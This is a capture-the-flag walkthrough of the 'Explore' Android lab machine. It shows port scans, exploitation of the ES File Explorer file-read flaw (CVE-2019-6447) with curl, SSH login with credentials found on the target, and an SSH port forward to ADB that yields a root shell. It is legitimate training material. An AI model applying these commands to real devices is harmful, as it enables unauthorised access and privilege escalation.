Explore is an easy difficulty Android machine. Network enumeration reveals a vulnerable service that is exploitable via a Metasploit module, and gives restricted read access to the machine. Further enumeration of the files, reveals the SSH credentials of a system user, allowing this way remote access to the machine. Finally, the attacker is able to forward a filtered port locally using SSH tunneling, in order to access the Android shell over the Android Debug Bridge (ADB). This eventuality allows the attacker to execute commands as the root user.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.10.247 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.10.247 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```

<br />

This machine was very unstable, so I had to perform several scans to find all the open ports, there were **3 open ports**:
+ **2222/tcp**
+ **42135/tcp**
+ **59777/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.247 -p 2222,42135,59777 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```

<br />

The services correspond to:
+ **2222/tcp Banana Studio SSH server app (net.xnano.android.sshserver.tv) (protocol 2.0)**
+ **42135/tcp ES File Explorer Name Response httpd**
+ **59777/tcp Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.247 -p 2222,42135,59777 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```

<br />

This scan didn't return any relevant information.

### Foothold

I hadn't faced an Android machine before this one, so this machine was actually hard for me.

<br />

If we browse for **ES File Explorer exploit** in Google, we will find **CVE-2019-6447**:<br />

![](/assets/Explore/1.png)

<br />
<br />

This vulnerability seems to require **port 59777 to be open**, which it is, so we can try it to see if it works:<br />

![](/assets/Explore/2.png)

<br />
<br />

It seems that we can send a **POST request** to this post with some **JSON data** to perform **arbitrary file read**:<br />

![](/assets/Explore/3.png)

<br />
<br />

Great! It worked! After a bit of investigation, we can find a picture named **creds.jpg** by sending `listPics` as the command:<br />

![](/assets/Explore/4.png)

<br />
<br />

We can download it using `curl` and then inspect it:

```bash
curl -d '{"command": getFile}' -H 'Content-Type: application/json' http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg --output creds.jpg
display creds.jpg
```

![](/assets/Explore/5.png)

<br />
<br />

This is... a CTF definitely. We can use this credential to login the machine, however we will receive an **error related to the host key type**, so we have to specify the key type to login:

```bash
ssh kristi@10.10.10.247 -oHostKeyAlgorithms=+ssh-rsa -p 2222
```

![](/assets/Explore/6.png)

<br />
<br />

We can inspect the **/storage/emulated/0/ directory**, as it's the directory where user's data is saved:

```bash
ls -la /storage/emulated/0/
```

![](/assets/Explore/7.png)

<br />
<br />

Here is the flag, let's print it and go for privilege escalation:

```bash
cat /storage/emulated/0/user.txt
```

### Privilege Escalation

<br />

Privilege escalation in this machine is "easy", the quotes are there as **port forwarding** is a concept I mistake very often, so it took me a while to switch from remote port forwarding to local port forwarding.

<br />

Enumerating the connections in this machine, we can find a **port that is not exposed**:

```bash
netstat -tulpen
```

![](/assets/Explore/9.png)

<br />
<br />

**Port 5555** is behind a firewall, so it must be important, searching for it in the Internet, I found that it's the port for **ADB (Android Debug Bridge)**, anything related to debugging is interested, however we can't connect to it from our machine and the victim don't have the command `adb` installed, so we have to perform **port forwarding**, I will try to explain the command the best I can:

```bash
ssh -N -L 10.10.16.6:5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -oHostKeyAlgorithms=+ssh-rsa
```

<br />

We have to think that the **port forwarding is being performed by the target machine**, so we are **redirecting traffic from the port 5555 (first 5555) of the machine executing the `ssh` command (our kali machine, with it's VPN IP) to the machine that is performing the port forwarding (the victim machine, that's why the IP is 127.0.0.1, as the port is only accessible at the localhost IP), on its port 5555 (second 5555)**, this way we can connect to our own port 5555 using `adb`, but the traffic will be redirected to the victim.

<br />

Now to leverage this port forward we have to specify our VPN IP, it doesn't work with our localhost IP, and the port:

```bash
adb connect 10.10.16.6:5555
```

![](/assets/Explore/10.png)

<br />
<br />

We can now leverage ADB to **connect as root** to the machine:

```bash
adb root
adb shell
```

![](/assets/Explore/11.png)

<br />
<br />

We can use the `find` command to search for the root flag:

```bash
find / -name root.txt 2>/dev/null
cat /data/root.txt
```
